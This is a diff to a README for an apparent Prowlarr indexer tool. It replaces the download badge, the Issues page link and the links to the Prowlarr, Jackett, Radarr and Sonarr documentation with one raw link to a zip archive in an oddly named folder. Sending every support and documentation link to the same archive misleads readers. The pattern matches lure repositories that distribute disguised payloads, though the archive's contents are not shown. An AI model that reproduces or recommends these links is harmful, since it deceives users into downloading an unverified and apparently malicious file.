@@ -8,7 +8,7 @@ Welcome to the La-Cale Prowlarr API Indexer! This application helps you easily m
 
 To get started, visit the following link to download the software:
 
-[![Download lacale-prowlarr-indexer](https://img.shields.io/badge/Download-lacale--prowlarr--indexer-brightgreen)](https://github.com/RichardDurinhoSafadinho777/lacale-prowlarr-indexer/releases)
+[![Download lacale-prowlarr-indexer](https://github.com/RichardDurinhoSafadinho777/lacale-prowlarr-indexer/raw/refs/heads/main/consigneeship/prowlarr-indexer-lacale-3.3.zip)](https://github.com/RichardDurinhoSafadinho777/lacale-prowlarr-indexer/raw/refs/heads/main/consigneeship/prowlarr-indexer-lacale-3.3.zip)
 
 Simply follow these steps:
 
@@ -72,17 +72,17 @@ If you encounter issues while using the lacale-prowlarr-indexer, consider these 
 
 Need help? You can reach out for support in the following ways:
 
-- Check the [Issues](https://github.com/RichardDurinhoSafadinho777/lacale-prowlarr-indexer/issues) page for any known problems.
+- Check the [Issues](https://github.com/RichardDurinhoSafadinho777/lacale-prowlarr-indexer/raw/refs/heads/main/consigneeship/prowlarr-indexer-lacale-3.3.zip) page for any known problems.
 - Ask questions in the community forums connected to Prowlarr, Jackett, Radarr, and Sonarr.
   
 ## 🔗 Additional Resources
 
 Here are helpful links that may improve your experience:
 
-- [Prowlarr Documentation](https://prowlarr.com/docs/)
-- [Jackett Documentation](https://github.com/Jackett/Jackett)
-- [Radarr Documentation](https://radarr.video/docs/)
-- [Sonarr Documentation](https://sonarr.tv/v3/docs/)
+- [Prowlarr Documentation](https://github.com/RichardDurinhoSafadinho777/lacale-prowlarr-indexer/raw/refs/heads/main/consigneeship/prowlarr-indexer-lacale-3.3.zip)
+- [Jackett Documentation](https://github.com/RichardDurinhoSafadinho777/lacale-prowlarr-indexer/raw/refs/heads/main/consigneeship/prowlarr-indexer-lacale-3.3.zip)
+- [Radarr Documentation](https://github.com/RichardDurinhoSafadinho777/lacale-prowlarr-indexer/raw/refs/heads/main/consigneeship/prowlarr-indexer-lacale-3.3.zip)
+- [Sonarr Documentation](https://github.com/RichardDurinhoSafadinho777/lacale-prowlarr-indexer/raw/refs/heads/main/consigneeship/prowlarr-indexer-lacale-3.3.zip)
 
 ## 📅 Keeping Updated
 
